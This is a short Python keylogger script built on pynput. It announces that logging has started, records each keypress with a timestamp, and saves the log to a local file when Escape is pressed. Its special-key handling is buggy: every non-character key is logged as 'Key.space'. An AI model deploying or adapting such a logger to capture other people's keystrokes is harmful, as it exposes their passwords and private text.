from pynput import keyboard
import os
import time
def on_press(key):
    try:
        d = time.strftime("%Y/%m/%d,%H:%M:%S")
        if key.char == ',':
            log.append('' + ',' + d + '\n')
        else:
            log.append(key.char + ',' + d + '\n')
    except AttributeError:
        # if key == keyboard.Key.space:
        log.append('Key.space' + ',' + d + '\n')
    if key == keyboard.Key.esc:
        # Stop listener
        exit()

def start_wisper():
    if not os.path.exists("logs"):
        os.makedirs("logs")
    print("You've started the keylogger. Press your escape key to stop logging.")
    global log
    log = []
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    date = time.strftime("Log_%Y-%m-%d_%H-%M-%S")
    with open('logs/' + date + ".txt", 'w') as file:
        for key in log:
            file.write(str(key))

if __name__ == "__main__":
    start_wisper()